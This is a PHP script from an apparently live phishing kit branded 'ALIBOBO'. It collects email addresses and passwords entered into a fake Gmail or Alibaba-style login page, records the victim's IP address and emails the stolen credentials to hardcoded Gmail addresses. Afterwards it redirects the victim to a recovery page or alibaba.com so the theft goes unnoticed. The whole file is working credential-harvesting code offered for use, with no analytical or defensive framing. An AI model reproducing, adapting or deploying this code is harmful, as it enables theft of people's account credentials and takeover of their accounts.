<?

$select= $_POST['select'];
if ($select=="Gmail")
{
	
	
$ip = getenv("REMOTE_ADDR");
$message .= "--------------Logon Result-----------------------\n";
$message .= "Domain: ".$_POST['select']."\n";
$message .= "ID: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['pass']."\n";

$message .= "IP: ".$ip."\n";
$message .= "---------------Created By ALIBOBO----------------------------\n";


$recipient = "willism229@gmail.com";
$subject = "New Message From ALIBOBO";
 mail("$to", " Login", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: recover.html");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }
	   
}
else
{
	


$ip = getenv("REMOTE_ADDR");
$message .= "--------------Logon Result-----------------------\n";
$message .= "Domain: ".$_POST['select']."\n";
$message .= "ID: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['pass']."\n";

$message .= "IP: ".$ip."\n";
$message .= "---------------Created By ALIBOBO----------------------------\n";


$recipient = "anobchris@gmail.com";
$subject = "New Message From ALIBOBO";
 mail("$to", " Login", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://www.alibaba.com");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }
}

?>